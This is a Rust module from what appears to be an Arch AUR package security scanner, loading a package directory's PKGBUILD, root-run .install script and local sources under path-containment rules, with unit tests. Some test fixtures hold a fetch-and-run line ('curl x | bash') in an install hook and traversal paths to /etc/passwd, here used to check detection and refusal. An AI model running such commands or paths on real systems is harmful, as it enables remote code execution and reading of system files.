//! Scan a local package directory as a whole.
//!
//! `--pkgbuild FILE` reads one file. That misses the two inputs that turned out
//! to matter most: the `.install` script, which pacman executes as root and
//! which carried the payload in the July 2026 campaign, and committed `source=()`
//! files, which land in `$srcdir` and can be `source`d at build time.
//!
//! This module builds a real `PackageContext` from a directory without touching
//! the network, so the same analysis that runs on an AUR clone runs on a checkout.
//! It is also what the `makepkg` wrapper and the corpus tests use.
//!
//! Safety rules, because the directory is untrusted:
//!
//! - every read is confined to the canonicalized package directory; `..`,
//!   absolute paths and symlinks that escape are refused, not followed
//! - only UTF-8 text is analysed, so a binary payload cannot be smuggled in
//! - total local-source bytes and file count are capped, and truncation is
//!   reported rather than silently ignored

use crate::shared::models::PackageContext;
use std::path::{Path, PathBuf};

/// Maximum number of local `source=()` files to read.
const MAX_LOCAL_SOURCES: usize = 32;
/// Maximum size of one local source file, in bytes.
const MAX_LOCAL_SOURCE_BYTES: u64 = 256 * 1024;
/// Maximum total bytes read across all local sources.
const MAX_LOCAL_SOURCE_TOTAL: u64 = 1024 * 1024;

/// A local `source=()` file and its content.
#[derive(Debug, Clone)]
pub struct LocalSource {
    /// Name as written in the PKGBUILD or `.SRCINFO`.
    pub name: String,
    pub content: String,
}

/// Result of loading a directory.
#[derive(Debug)]
pub struct LoadedPackage {
    pub context: PackageContext,
    /// Names that could not be read, with the reason. Reported, never silent.
    pub skipped_sources: Vec<(String, String)>,
    /// True when a cap was hit and some sources were not analysed.
    pub capped: bool,
}

/// Load `dir` into a `PackageContext` for offline analysis.
pub fn load_dir(name: &str, dir: &Path) -> Result<LoadedPackage, String> {
    let root = dir
        .canonicalize()
        .map_err(|e| format!("cannot resolve {}: {e}", dir.display()))?;

    let pkgbuild_path = if root.is_dir() {
        root.join("PKGBUILD")
    } else {
        root.clone()
    };
    let content = std::fs::read_to_string(&pkgbuild_path)
        .map_err(|e| format!("cannot read {}: {e}", pkgbuild_path.display()))?;
    let base_dir = if root.is_dir() {
        root.clone()
    } else {
        root.parent().unwrap_or(Path::new(".")).to_path_buf()
    };

    // The `.install` script pacman will execute, resolved the way makepkg does.
    let mut skipped_sources = Vec::new();
    let install_script_content = resolve_install_script(&base_dir, &content);

    // Committed local sources: the execution channel that scored TRUSTED.
    let (local_sources, capped) = read_local_sources(&base_dir, &content, &mut skipped_sources);

    let context = PackageContext {
        name: name.to_string(),
        metadata: None,
        pkgbuild_content: Some(content),
        install_script_content,
        prior_pkgbuild_content: None,
        git_log: vec![],
        maintainer_packages: vec![],
        github_stars: None,
        github_not_found: false,
        aur_comments: vec![],
        local_sources,
        source_path: Some(base_dir),
        incomplete: vec![],
    };

    Ok(LoadedPackage {
        context,
        skipped_sources,
        capped,
    })
}

/// The file name declared by `install=`, whether or not it can be read.
///
/// Used to report an unresolved install script instead of silently analysing
/// nothing: pacman executes that file as root.
pub fn declared_install_path(pkgbuild: &str) -> Option<String> {
    for line in pkgbuild.lines() {
        let trimmed = line.trim();
        let Some(rest) = trimmed.strip_prefix("install") else {
            continue;
        };
        let rest = rest.trim_start();
        let Some(value) = rest.strip_prefix('=') else {
            continue;
        };
        let value = value
            .trim()
            .trim_end_matches(';')
            .trim_matches(|c| c == '\'' || c == '"');
        if value.is_empty() {
            continue;
        }
        let expanded = expand_pkg_vars(value, pkgbuild);
        if !expanded.is_empty() {
            return Some(expanded);
        }
    }
    None
}

/// Resolve `install=` to a file inside the package directory.
///
/// Handles the forms that exist in the wild: `install=foo.install`,
/// `install = foo.install` (spaces), `install="$pkgname.install"`,
/// `install=${pkgbase}.install`, and a script delivered as a `source=()` entry.
/// The previous implementation only matched a literal `install=` prefix, so
/// the spaced form was never analysed.
pub fn resolve_install_script(base_dir: &Path, pkgbuild: &str) -> Option<String> {
    let mut candidates: Vec<String> = Vec::new();

    for line in pkgbuild.lines() {
        let trimmed = line.trim();
        if !trimmed.starts_with("install") {
            continue;
        }
        // Must be `install` followed by `=` or whitespace then `=`.
        let rest = trimmed.strip_prefix("install")?;
        let rest = rest.trim_start();
        let Some(value) = rest.strip_prefix('=') else {
            continue;
        };
        let value = value.trim().trim_matches(|c| c == '\'' || c == '"');
        if value.is_empty() {
            continue;
        }
        // Expand the package-name variables makepkg would.
        let expanded = expand_pkg_vars(value, pkgbuild);
        candidates.push(expanded);
    }

    // Fall back to the conventional names when `install=` could not be resolved.
    candidates.push("install".to_string());

    for candidate in candidates {
        if let Some(content) = read_confined(base_dir, &candidate) {
            return Some(content);
        }
    }
    None
}

/// Expand `$pkgname`, `${pkgname}`, `$pkgbase` and `${pkgbase}` in `value`.
fn expand_pkg_vars(value: &str, pkgbuild: &str) -> String {
    let pkgname = pkgbuild
        .lines()
        .find_map(|l| l.trim().strip_prefix("pkgname="))
        .and_then(|v| {
            let v = v.trim();
            // `pkgname=('a' 'b')` -> first name.
            let first = v.trim_start_matches('(').split_whitespace().next()?;
            Some(first.trim_matches(|c| c == '\'' || c == '"').to_string())
        })
        .unwrap_or_default();
    let pkgbase = pkgbuild
        .lines()
        .find_map(|l| l.trim().strip_prefix("pkgbase="))
        .map(|v| v.trim().trim_matches(|c| c == '\'' || c == '"').to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| pkgname.clone());

    value
        .replace("${pkgname}", &pkgname)
        .replace("$pkgname", &pkgname)
        .replace("${pkgbase}", &pkgbase)
        .replace("$pkgbase", &pkgbase)
}

/// Read local (non-URL) `source=()` entries.
///
/// Returns the sources plus whether a cap was hit. Entries that are URLs, VCS
/// URLs, or already represented as an install script are skipped: they are not
/// on disk yet, so "absent" must not be reported as "clean".
fn read_local_sources(
    base_dir: &Path,
    pkgbuild: &str,
    skipped: &mut Vec<(String, String)>,
) -> (Vec<LocalSource>, bool) {
    let entries = source_entries(pkgbuild);
    let mut out = Vec::new();
    let mut total: u64 = 0;
    let mut capped = false;

    for entry in entries {
        if out.len() >= MAX_LOCAL_SOURCES {
            capped = true;
            break;
        }
        // `name::url` specs: only the left side could be local.
        let path_part = entry.split("::").next().unwrap_or(&entry).trim();
        let path_part = path_part.trim_matches(|c| c == '\'' || c == '"');

        let is_remote = path_part.contains("://")
            || path_part.contains('$')
            || matches!(
                path_part.split_once('+').map(|(scheme, _)| scheme),
                Some("git") | Some("hg") | Some("svn") | Some("bzr")
            );
        if is_remote || path_part.is_empty() {
            continue;
        }
        // Renamed download (`file.zip`) with no local file is normal.
        let local_path = base_dir.join(path_part.trim_start_matches("file://"));
        let size = match std::fs::metadata(&local_path) {
            Ok(m) if m.is_file() => m.len(),
            Ok(_) => continue,
            Err(_) => continue, // fetched at build time, not present locally
        };
        if size > MAX_LOCAL_SOURCE_BYTES {
            skipped.push((
                path_part.to_string(),
                format!("larger than {} KiB", MAX_LOCAL_SOURCE_BYTES / 1024),
            ));
            continue;
        }
        if total + size > MAX_LOCAL_SOURCE_TOTAL {
            capped = true;
            break;
        }
        match read_confined(base_dir, path_part) {
            Some(content) => {
                total += size;
                out.push(LocalSource {
                    name: path_part.to_string(),
                    content,
                });
            }
            None => skipped.push((
                path_part.to_string(),
                "not readable as UTF-8 text inside the package directory".to_string(),
            )),
        }
    }

    (out, capped)
}

/// Extract the entries of every `source`/`source_arch` array.
fn source_entries(pkgbuild: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut in_array = false;
    let mut depth = 0i32;

    for line in pkgbuild.lines() {
        let trimmed = line.trim();
        if !in_array {
            let is_source = trimmed.starts_with("source=")
                || (trimmed.starts_with("source_") && trimmed.contains('='));
            if is_source && trimmed.contains('(') {
                in_array = true;
                depth = trimmed.matches('(').count() as i32 - trimmed.matches(')').count() as i32;
                let body = trimmed.split_once('(').map(|(_, b)| b).unwrap_or("");
                out.extend(tokens(body));
                if depth <= 0 {
                    in_array = false;
                }
            }
            continue;
        }
        depth += trimmed.matches('(').count() as i32 - trimmed.matches(')').count() as i32;
        let body = trimmed.trim_end_matches(')');
        out.extend(tokens(body));
        if depth <= 0 {
            in_array = false;
        }
    }
    out
}

/// Word-split an array body, dropping comments, treating `::` as a joiner.
fn tokens(body: &str) -> Vec<String> {
    let stripped = match body.find('#') {
        Some(idx) if body[..idx].trim().is_empty() || true => &body[..idx],
        _ => body,
    };
    stripped
        .split_whitespace()
        .filter(|t| !t.is_empty() && *t != "::")
        // A single-line array leaves the closing `)` attached to the last
        // entry (`'blob.bin')`); trim syntax characters on both sides.
        .map(|t| t.trim_matches(|c| c == '\'' || c == '"' || c == '(' || c == ')').to_string())
        .filter(|t| !t.is_empty())
        .collect()
}

/// Read a file only if it resolves inside `base_dir`.
///
/// This is the containment rule for an untrusted directory: `../../etc/shadow`
/// and a symlink pointing outside the package must both fail.
fn read_confined(base_dir: &Path, name: &str) -> Option<String> {
    if name.contains("..") || Path::new(name).is_absolute() {
        return None;
    }
    let base = base_dir.canonicalize().ok()?;
    let candidate = base.join(name);
    let resolved = candidate.canonicalize().ok()?;
    if !resolved.starts_with(&base) {
        return None;
    }
    let meta = std::fs::metadata(&resolved).ok()?;
    if !meta.is_file() || meta.len() > MAX_LOCAL_SOURCE_BYTES {
        return None;
    }
    std::fs::read_to_string(&resolved).ok()
}

/// Directory a `--pkgbuild FILE` argument implies.
pub fn package_dir_for(file: &Path) -> PathBuf {
    file.parent()
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| PathBuf::from("."))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_pkg(name: &str, files: &[(&str, &str)]) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "traur-loadtest-{}-{}",
            std::process::id(),
            name
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        for (f, c) in files {
            std::fs::write(dir.join(f), c).unwrap();
        }
        dir
    }

    const BASE: &str = "pkgname=split-test\npkgver=1\npkgrel=1\n";

    #[test]
    fn literal_install_directive_is_read() {
        let dir = temp_pkg(
            "literal",
            &[
                ("PKGBUILD", &format!("{BASE}install=evil.install\nsource=()\n")),
                ("evil.install", "post_install() { curl x | bash; }\n"),
            ],
        );
        let loaded = load_dir("split-test", &dir).unwrap();
        assert_eq!(
            loaded.context.install_script_content.as_deref(),
            Some("post_install() { curl x | bash; }\n")
        );
    }

    #[test]
    fn spaced_install_directive_is_read() {
        let dir = temp_pkg(
            "spaced",
            &[
                ("PKGBUILD", &format!("{BASE}install = evil.install\n")),
                ("evil.install", "post_install() {\n  :\n}\n"),
            ],
        );
        let loaded = load_dir("split-test", &dir).unwrap();
        assert!(loaded.context.install_script_content.is_some(), "spaced form");
    }

    #[test]
    fn install_directive_with_variable_is_read() {
        let dir = temp_pkg(
            "varform",
            &[
                (
                    "PKGBUILD",
                    &format!("{BASE}install=\"$pkgname.install\"\n"),
                ),
                ("split-test.install", "post_upgrade() {\n  :\n}\n"),
            ],
        );
        let loaded = load_dir("split-test", &dir).unwrap();
        assert!(loaded.context.install_script_content.is_some(), "$pkgname form");
    }

    #[test]
    fn local_source_is_loaded_and_remote_is_not() {
        let dir = temp_pkg(
            "sources",
            &[
                (
                    "PKGBUILD",
                    &format!(
                        "{BASE}source=('config.defaults' 'https://x/y.tar.gz' \"$pkgname.zip\")\n"
                    ),
                ),
                ("config.defaults", "x=1\n"),
            ],
        );
        let loaded = load_dir("split-test", &dir).unwrap();
        let names: Vec<&str> = loaded
            .context
            .local_sources
            .iter()
            .map(|s| s.name.as_str())
            .collect();
        assert_eq!(names, vec!["config.defaults"]);
    }

    #[test]
    fn multi_line_source_array_is_parsed() {
        let dir = temp_pkg(
            "multiline",
            &[
                (
                    "PKGBUILD",
                    &format!("{BASE}source=(\n  'a.patch'\n  \"https://x/y\"\n)\n"),
                ),
                ("a.patch", "diff --git a b\n"),
            ],
        );
        let loaded = load_dir("split-test", &dir).unwrap();
        assert_eq!(loaded.context.local_sources.len(), 1);
        assert_eq!(loaded.context.local_sources[0].name, "a.patch");
    }

    #[test]
    fn traversal_in_install_directive_is_refused() {
        let dir = temp_pkg("traversal", &[("PKGBUILD", &format!("{BASE}install=../../etc/passwd\n"))]);
        let loaded = load_dir("split-test", &dir).unwrap();
        assert!(loaded.context.install_script_content.is_none());
    }

    #[test]
    fn traversal_in_source_is_refused() {
        let dir = temp_pkg(
            "traversal2",
            &[("PKGBUILD", &format!("{BASE}source=('../../../etc/passwd')\n"))],
        );
        let loaded = load_dir("split-test", &dir).unwrap();
        assert!(loaded.context.local_sources.is_empty());
    }

    #[test]
    fn absolute_install_path_is_refused() {
        let dir = temp_pkg("abspath", &[("PKGBUILD", &format!("{BASE}install=/etc/passwd\n"))]);
        let loaded = load_dir("split-test", &dir).unwrap();
        assert!(loaded.context.install_script_content.is_none());
    }

    #[test]
    fn binary_local_source_is_skipped_with_a_reason() {
        let dir = temp_pkg("binary", &[("PKGBUILD", &format!("{BASE}source=('blob.bin')\n"))]);
        std::fs::write(dir.join("blob.bin"), [0u8, 159, 146, 150]).unwrap();
        let loaded = load_dir("split-test", &dir).unwrap();
        assert!(loaded.context.local_sources.is_empty());
        assert_eq!(loaded.skipped_sources.len(), 1);
        assert_eq!(loaded.skipped_sources[0].0, "blob.bin");
    }

    #[test]
    fn symlink_escaping_the_directory_is_refused() {
        #[cfg(unix)]
        {
            let dir = temp_pkg("symlink", &[("PKGBUILD", &format!("{BASE}source=('link')\n"))]);
            std::os::unix::fs::symlink("/etc/passwd", dir.join("link")).unwrap();
            let loaded = load_dir("split-test", &dir).unwrap();
            assert!(loaded.context.local_sources.is_empty());
        }
    }

    #[cfg(unix)]
    #[test]
    fn symlink_inside_the_directory_is_allowed() {
        let dir = temp_pkg(
            "symlink_in",
            &[
                ("PKGBUILD", &format!("{BASE}source=('link')\n")),
                ("real.patch", "ok"),
            ],
        );
        std::os::unix::fs::symlink(dir.join("real.patch"), dir.join("link")).unwrap();
        let loaded = load_dir("split-test", &dir).unwrap();
        assert_eq!(loaded.context.local_sources.len(), 1);
    }

    #[test]
    fn source_path_is_recorded_for_reporting() {
        let dir = temp_pkg("pathrec", &[("PKGBUILD", "pkgname=x\n")]);
        let loaded = load_dir("x", &dir).unwrap();
        assert!(loaded.context.source_path.is_some());
    }
}
